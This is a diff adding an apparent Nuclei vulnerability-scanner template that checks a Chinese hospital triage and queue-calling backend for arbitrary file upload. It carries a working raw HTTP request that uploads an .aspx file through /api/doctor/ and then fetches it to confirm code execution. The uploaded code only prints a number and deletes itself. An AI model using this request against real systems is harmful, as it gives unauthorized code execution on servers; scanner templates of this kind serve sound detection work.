@@ -1,0 +1,71 @@
+id: fenhao-doctor-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 北京神州视翰科技有限公司分诊叫号后台系统存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E7%A5%9E%E5%B7%9E/%E5%88%86%E8%AF%8A%E5%8F%AB%E5%8F%B7%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+  
+http:
+  - raw:
+      - |-
+        POST /api/doctor/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 876
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: need_login=
+        Connection: close
+
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="doctorid"
+
+        0
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="login_id"
+
+        {{filename}}.aspx
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="name"
+
+        22
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="title"
+
+        23
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="department"
+
+        24
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="description"
+
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="icon"; filename="11.txt"
+        Content-Type: text/aspx
+
+        <%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc--
+      - |+
+        GET /Web/images/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '12321'
